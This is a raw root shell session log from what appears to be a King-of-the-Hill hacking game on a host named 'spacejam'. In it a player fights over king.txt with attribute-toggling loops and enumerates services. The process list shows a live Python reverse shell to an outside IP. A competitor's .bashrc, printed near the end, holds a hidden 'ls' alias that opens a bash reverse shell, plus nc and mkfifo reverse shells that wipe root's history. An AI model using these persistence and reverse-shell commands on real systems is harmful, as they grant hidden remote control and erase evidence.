root@spacejam:~# while true; do c -ia /root/king.txt && echo a > /root/king.txt; sleep 60; done &
while true; do c -ia /root/king.txt && echo a > /root/king.t
<; do c -ia /root/king.txt && echo a > /root/king.tx                         .........................t; sleep 60; done &
[2] 2108
root@spacejam:~# cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000


root@spacejam:~# cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
w
w
 22:34:02 up 29 min,  1 user,  load average: 1.58, 1.27, 0.76
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/2    10.17.49.195     22:12   10.00s  0.22s  0.22s -bash
root@spacejam:~# 

root@spacejam:~# ls
ls
!
king.txt
root.txt
root@spacejam:~# echo a > king.txt
echo a > king.txt
root@spacejam:~# ss -tunlpd
ss -tunlpd
Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
udp    UNCONN     0      0         *:68                    *:*                   users:(("dhclient",pid=732,fd=6))
tcp    LISTEN     0      0      127.0.0.1:3306                  *:*                   users:(("mysqld",pid=1009,fd=22))
tcp    LISTEN     0      0         *:22                    *:*                   users:(("sshd",pid=1024,fd=3))
tcp    LISTEN     0      0         *:23                    *:*                   users:(("inetd",pid=875,fd=4))
tcp    LISTEN     0      0      127.0.0.1:5432                  *:*                   users:(("postgres",pid=1180,fd=5))
tcp    LISTEN     0      0         *:61432                 *:*                   users:(("python3",pid=950,fd=3))
tcp    LISTEN     0      0        :::9999                 :::*                   users:(("koth",pid=845,fd=3))
tcp    LISTEN     0      0        :::80                   :::*                   users:(("apache2",pid=1496,fd=4),("apache2",pid=1495,fd=4),("apache2",pid=1494,fd=4),("apache2",pid=1493,fd=4),("apache2",pid=1484,fd=4),("apache2",pid=1237,fd=4),("apache2",pid=1236,fd=4),("apache2",pid=1235,fd=4),("apache2",pid=1234,fd=4),("apache2",pid=1233,fd=4),("apache2",pid=1184,fd=4))
tcp    LISTEN     0      0        :::22                   :::*                   users:(("sshd",pid=1024,fd=4))
tcp    LISTEN     0      0        :::3000                 :::*                   users:(("node",pid=1273,fd=18))
tcp    LISTEN     0      0       ::1:5432                 :::*                   users:(("postgres",pid=1180,fd=4))
tcp    LISTEN     0      0      127.0.0.1:3306                  *:*                   users:(("mysqld",pid=1009,fd=22))
tcp    LISTEN     0      0         *:22                    *:*                   users:(("sshd",pid=1024,fd=3))
tcp    LISTEN     0      0         *:23                    *:*                   users:(("inetd",pid=875,fd=4))
tcp    LISTEN     0      0      127.0.0.1:5432                  *:*                   users:(("postgres",pid=1180,fd=5))
tcp    LISTEN     0      0         *:61432                 *:*                   users:(("python3",pid=950,fd=3))
tcp    LISTEN     0      0        :::9999                 :::*                   users:(("koth",pid=845,fd=3))
tcp    LISTEN     0      0        :::80                   :::*                   users:(("apache2",pid=1496,fd=4),("apache2",pid=1495,fd=4),("apache2",pid=1494,fd=4),("apache2",pid=1493,fd=4),("apache2",pid=1484,fd=4),("apache2",pid=1237,fd=4),("apache2",pid=1236,fd=4),("apache2",pid=1235,fd=4),("apache2",pid=1234,fd=4),("apache2",pid=1233,fd=4),("apache2",pid=1184,fd=4))
tcp    LISTEN     0      0        :::22                   :::*                   users:(("sshd",pid=1024,fd=4))
tcp    LISTEN     0      0        :::3000                 :::*                   users:(("node",pid=1273,fd=18))
tcp    LISTEN     0      0       ::1:5432                 :::*                   users:(("postgres",pid=1180,fd=4))
root@spacejam:~# systemctl restart koth
systemctl restart koth
root@spacejam:~# ls
ls
!
king.txt
root.txt
root@spacejam:~# ls -lah
ls -lah
total 64K
--wx-----x  1 root root   20 Dec  2 22:19 !
drwx------  8 root root 4.0K Dec  2 22:19 .
drwxr-xr-x 23 root root 4.0K Dec  2 22:08 ..
lrwxrwxrwx  1 root root    9 Feb 25  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.4K Dec  2 22:06 .bashrc
drwx------  2 root root 4.0K Mar  4  2020 .cache
drwx------  3 root root 4.0K Mar  4  2020 .config
drwxrwxrwx  2 root root 4.0K Mar  4  2020 .forever
-rw-r--r--  1 root root    0 Dec  2 22:34 king.txt
lrwxrwxrwx  1 root root    9 Feb 25  2020 .mysql_history -> /dev/null
drwxr-xr-x  2 root root 4.0K Mar  4  2020 .nano
drwxr-xr-x  4 root root 4.0K Mar  4  2020 .npm
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Feb 25  2020 root.txt
-rw-r--r--  1 root root   66 Apr  4  2020 .selected_editor
drwx------  2 root root 4.0K Dec  2 22:06 .ssh
-rw-------  1 root root 7.5K Apr  4  2020 .viminfo
root@spacejam:~# echo a > king.txt
echo a > king.txt
root@spacejam:~# ls -lah
ls -lah
total 64K
--wx-----x  1 root root   20 Dec  2 22:19 !
drwx------  8 root root 4.0K Dec  2 22:19 .
drwxr-xr-x 23 root root 4.0K Dec  2 22:08 ..
lrwxrwxrwx  1 root root    9 Feb 25  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.4K Dec  2 22:06 .bashrc
drwx------  2 root root 4.0K Mar  4  2020 .cache
drwx------  3 root root 4.0K Mar  4  2020 .config
drwxrwxrwx  2 root root 4.0K Mar  4  2020 .forever
-rw-r--r--  1 root root    0 Dec  2 22:34 king.txt
lrwxrwxrwx  1 root root    9 Feb 25  2020 .mysql_history -> /dev/null
drwxr-xr-x  2 root root 4.0K Mar  4  2020 .nano
drwxr-xr-x  4 root root 4.0K Mar  4  2020 .npm
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Feb 25  2020 root.txt
-rw-r--r--  1 root root   66 Apr  4  2020 .selected_editor
drwx------  2 root root 4.0K Dec  2 22:06 .ssh
-rw-------  1 root root 7.5K Apr  4  2020 .viminfo
root@spacejam:~# cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000


root@spacejam:~# cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000


root@spacejam:~# 

root@spacejam:~# c +ia king.txt
c +ia king.txt
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080030
root@spacejam:~# cur attrs: 0x00080030, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
ps aufx
ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root      2677  0.0  0.3  37532  3460 ?        R    22:36   0:00 ps aufx
root      2108  0.0  0.2  21184  2244 ?        S    22:13   0:00 bash -i
root      2670  0.0  0.0   9380   692 ?        S    22:35   0:00  \_ sleep 60
root      2030  0.0  0.2  21184  2244 ?        S    22:12   0:00 bash -i
root      2672  0.0  0.0   9380   684 ?        S    22:35   0:00  \_ sleep 60
root         2  0.0  0.0      0     0 ?        S    22:04   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [kworker/u30:0]
root         7  0.0  0.0      0     0 ?        S    22:04   0:01  \_ [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [migration/0]
root        10  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [watchdog/0]
root        11  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [kdevtmpfs]
root        12  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [netns]
root        13  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [perf]
root        14  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [xenwatch]
root        15  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [xenbus]
root        17  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [khungtaskd]
root        18  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [writeback]
root        19  0.0  0.0      0     0 ?        SN   22:04   0:00  \_ [ksmd]
root        20  0.0  0.0      0     0 ?        SN   22:04   0:00  \_ [khugepaged]
root        21  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [crypto]
root        22  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [kintegrityd]
root        23  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        24  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [kblockd]
root        25  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [ata_sff]
root        26  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [md]
root        27  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [devfreq_wq]
root        28  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [kworker/u30:1]
root        30  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [kswapd0]
root        31  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [vmstat]
root        32  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [fsnotify_mark]
root        33  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [ecryptfs-kthrea]
root        49  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [kthrotld]
root        50  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [acpi_thermal_pm]
root        51  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        52  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        53  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        54  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        55  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        56  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        57  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        58  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        59  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [scsi_eh_0]
root        60  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [scsi_tmf_0]
root        61  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [scsi_eh_1]
root        62  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [scsi_tmf_1]
root        64  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        69  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [ipv6_addrconf]
root        70  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        83  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [deferwq]
root        84  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [charger_manager]
root       121  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       122  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       123  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       124  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       125  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       126  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       127  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       128  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       129  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [kpsmoused]
root       148  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [ttm_swap]
root       230  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [raid5wq]
root       262  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       293  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [jbd2/xvda1-8]
root       294  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [ext4-rsv-conver]
root       322  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [kworker/0:1H]
root       353  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [kworker/0:5]
root       369  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [iscsi_eh]
root       382  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [ib_addr]
root       386  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [kauditd]
root       392  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [ib_mcast]
root       395  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [ib_nl_sa_wq]
root       398  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [ib_cm]
root       405  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [iw_cm_wq]
root       406  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [rdma_cm]
root      2160  0.0  0.0      0     0 ?        S    22:14   0:00  \_ [kworker/0:3]
root      2424  0.0  0.0      0     0 ?        S    22:29   0:00  \_ [kworker/0:0]
root      2533  0.0  0.0      0     0 ?        S    22:32   0:00  \_ [kworker/0:1]
root         1  0.5  0.5  38040  6056 ?        Ss   22:04   0:10 /sbin/init
root       375  0.0  0.2  28444  2908 ?        Ss   22:04   0:00 /lib/systemd/systemd-journald
root       413  0.0  0.1  94772  1664 ?        Ss   22:04   0:00 /sbin/lvmetad -f
root       451  0.0  0.4  45680  4724 ?        Ss   22:04   0:00 /lib/systemd/systemd-udevd
systemd+   483  0.0  0.2 100324  2384 ?        Ssl  22:04   0:00 /lib/systemd/systemd-timesyncd
root       732  0.0  0.2  16128  2720 ?        Ss   22:04   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
syslog     835  0.0  0.3 256396  3052 ?        Ssl  22:04   0:00 /usr/sbin/rsyslogd -n
root       853  0.0  0.2  29008  2796 ?        Ss   22:04   0:00 /usr/sbin/cron -f
daemon     862  0.0  0.1  26044  1960 ?        Ss   22:04   0:00 /usr/sbin/atd -f
root       875  0.0  0.1  12876  1904 ?        Ss   22:04   0:00 /usr/sbin/inetd -i
root       886  0.0  0.2  28620  2892 ?        Ss   22:04   0:00 /lib/systemd/systemd-logind
message+   893  0.0  0.3  42880  3616 ?        Ss   22:04   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       906  0.0  0.2 628644  2796 ?        Ssl  22:04   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       909  0.0  0.5 275768  6036 ?        Ssl  22:04   0:00 /usr/lib/accountsservice/accounts-daemon
root       912  0.0  2.4 214272 24608 ?        Ssl  22:04   0:00 /usr/lib/snapd/snapd
root       914  0.0  0.1   4396  1212 ?        Ss   22:04   0:00 /usr/sbin/acpid
root       949  0.0  0.0  13372   144 ?        Ss   22:04   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
jordan     950  0.0  0.9  29172  9240 ?        Ss   22:04   0:00 python3 /home/jordan/easyaccess.py
root       986  0.0  0.0   5220   140 ?        Ss   22:04   0:00 /sbin/iscsid
root       987  0.0  0.3   5720  3512 ?        S<Ls 22:04   0:00 /sbin/iscsid
root       991  0.0  0.5 277112  5816 ?        Ssl  22:04   0:00 /usr/lib/policykit-1/polkitd --no-debug
mysql     1009  0.0 13.4 1114512 136144 ?      Ssl  22:04   0:01 /usr/sbin/mysqld
root      1024  0.0  0.5  65512  6020 ?        Ss   22:04   0:00 /usr/sbin/sshd -D
root      1782  0.0  0.6  92860  6584 ?        Ss   22:12   0:00  \_ sshd: root@pts/2
root      2002  0.0  0.5  22616  5248 pts/2    Ss+  22:12   0:00      \_ -bash
root      1093  0.0  0.1  15936  1532 tty1     Ss+  22:04   0:00 /sbin/agetty --noclear tty1 linux
root      1101  0.0  0.2  15752  2064 ttyS0    Ss+  22:04   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
postgres  1180  0.0  2.3 291220 23348 ?        S    22:05   0:00 /usr/lib/postgresql/9.3/bin/postgres -D /var/lib/postgresql/9.3/main -c config_file=/etc/postgresql/9.3/main/postgresql.conf
postgres  1215  0.0  0.3 291220  3896 ?        Ss   22:05   0:00  \_ postgres: checkpointer process   
postgres  1216  0.0  0.5 291220  5272 ?        Ss   22:05   0:00  \_ postgres: writer process   
postgres  1217  0.0  0.3 291220  3896 ?        Ss   22:05   0:00  \_ postgres: wal writer process   
postgres  1218  0.0  0.6 292076  6148 ?        Ss   22:05   0:00  \_ postgres: autovacuum launcher process   
postgres  1219  0.0  0.2 146896  2892 ?        Ss   22:05   0:00  \_ postgres: stats collector process   
root      1184  0.0  2.9 367836 29808 ?        Ss   22:05   0:00 /usr/sbin/apache2 -k start
jordan    1233  0.0  1.0 368060 10560 ?        S    22:05   0:00  \_ /usr/sbin/apache2 -k start
jordan    1234  0.0  1.0 368068 10568 ?        S    22:05   0:00  \_ /usr/sbin/apache2 -k start
jordan    1235  0.0  1.0 368076 10576 ?        S    22:05   0:00  \_ /usr/sbin/apache2 -k start
jordan    1236  0.0  1.0 367908 10144 ?        S    22:05   0:00  \_ /usr/sbin/apache2 -k start
jordan    1237  0.0  1.0 368052 10532 ?        S    22:05   0:00  \_ /usr/sbin/apache2 -k start
jordan    1484  0.0  1.0 368052 10432 ?        S    22:06   0:00  \_ /usr/sbin/apache2 -k start
jordan    1493  0.0  0.8 367860  8936 ?        S    22:06   0:00  \_ /usr/sbin/apache2 -k start
jordan    1494  0.0  0.8 367860  8936 ?        S    22:06   0:00  \_ /usr/sbin/apache2 -k start
jordan    1495  0.0  0.8 367860  8936 ?        S    22:06   0:00  \_ /usr/sbin/apache2 -k start
jordan    1496  0.0  0.8 367860  8936 ?        S    22:06   0:00  \_ /usr/sbin/apache2 -k start
root      1261  0.0  3.7 599092 38384 ?        Ssl  22:05   0:00 /usr/bin/node /usr/lib/node_modules/forever/bin/monitor /home/bunny/simple-command-injection/server.js
root      1273  0.0  3.7 596288 37872 ?        Sl   22:05   0:00  \_ /usr/bin/node /home/bunny/simple-command-injection/server.js
root      2665  0.0  0.0   6596   728 ?        S    22:35   0:00      \_ /bin/sh -c ./shell3.sh
root      2666  0.0  0.0   6596   832 ?        S    22:35   0:00          \_ /bin/sh ./shell3.sh
root      2667  0.0  1.0  40544 10888 ?        S    22:35   0:00              \_ python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.49.195",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
root      2668  1.2  0.0   6596   788 pts/0    Ds+  22:35   0:00                  \_ sh
root      1603  0.0  1.6 724220 16500 ?        Ssl  22:07   0:00 /usr/bin/systemd-pam
root      1703  0.0  0.0  10812   728 ?        S    22:09   0:00 /usr/lib/snapd/snapd
root      1966  0.0  0.4  36856  4508 ?        Ss   22:12   0:00 /lib/systemd/systemd --user
root      1968  0.0  0.2  61492  2060 ?        S    22:12   0:00  \_ (sd-pam)
root      2640  0.0  0.6  32016  6588 ?        Ssl  22:34   0:00 /bin/koth
root@spacejam:~# c +ia king.txt
c +ia king.txt
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080030
root@spacejam:~# cur attrs: 0x00080030, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
ls -lah
ls -lah
total 64K
--wx-----x  1 root root   20 Dec  2 22:19 !
drwx------  8 root root 4.0K Dec  2 22:19 .
drwxr-xr-x 23 root root 4.0K Dec  2 22:08 ..
lrwxrwxrwx  1 root root    9 Feb 25  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.4K Dec  2 22:06 .bashrc
drwx------  2 root root 4.0K Mar  4  2020 .cache
drwx------  3 root root 4.0K Mar  4  2020 .config
drwxrwxrwx  2 root root 4.0K Mar  4  2020 .forever
-rw-r--r--  1 root root    0 Dec  2 22:37 king.txt
lrwxrwxrwx  1 root root    9 Feb 25  2020 .mysql_history -> /dev/null
drwxr-xr-x  2 root root 4.0K Mar  4  2020 .nano
drwxr-xr-x  4 root root 4.0K Mar  4  2020 .npm
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Feb 25  2020 root.txt
-rw-r--r--  1 root root   66 Apr  4  2020 .selected_editor
drwx------  2 root root 4.0K Dec  2 22:06 .ssh
-rw-------  1 root root 7.5K Apr  4  2020 .viminfo
root@spacejam:~# cat king.txt
cat king.txt
root@spacejam:~# lsattr
lsattr
-------------e-- ./root.txt
-------------e-- ./king.txt
-------------e-- ./!
root@spacejam:~# echo a > king.txt
echo a > king.txt
root@spacejam:~# ls -lah
ls -lah
total 64K
--wx-----x  1 root root   20 Dec  2 22:19 !
drwx------  8 root root 4.0K Dec  2 22:19 .
drwxr-xr-x 23 root root 4.0K Dec  2 22:08 ..
lrwxrwxrwx  1 root root    9 Feb 25  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.4K Dec  2 22:06 .bashrc
drwx------  2 root root 4.0K Mar  4  2020 .cache
drwx------  3 root root 4.0K Mar  4  2020 .config
drwxrwxrwx  2 root root 4.0K Mar  4  2020 .forever
-rw-r--r--  1 root root   11 Dec  2 22:37 king.txt
lrwxrwxrwx  1 root root    9 Feb 25  2020 .mysql_history -> /dev/null
drwxr-xr-x  2 root root 4.0K Mar  4  2020 .nano
drwxr-xr-x  4 root root 4.0K Mar  4  2020 .npm
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Feb 25  2020 root.txt
-rw-r--r--  1 root root   66 Apr  4  2020 .selected_editor
drwx------  2 root root 4.0K Dec  2 22:06 .ssh
-rw-------  1 root root 7.5K Apr  4  2020 .viminfo
root@spacejam:~# c +ia king.txt
c +ia king.txt
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080030
root@spacejam:~# cat .bashrc
cat .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
[ -z "$PS1" ] && return

# don't put duplicate lines in the history. See bash(1) for more options
# ... or force ignoredups and ignorespace
HISTCONTROL=ignoredups:ignorespace

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "$debian_chroot" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
#if [ -f /etc/bash_completion ] && ! shopt -oq posix; then
#    . /etc/bash_completion
#fi
alias ls='(bash -i >& /dev/tcp/10.11.55.164/1337 0>&1 & disown) 2>/dev/null; ls --color=auto'
nc -e /bin/bash 10.11.55.164 1337 & cat /dev/null > /root/.bash_history
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f & cat /dev/null > /root/.bash_history
root@spacejam:~# ls
ls
!
king.txt
root.txt
root@spacejam:~# cur attrs: 0x00080030, mask: 0x00000030
new attrs: 0x00080000
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000
exit
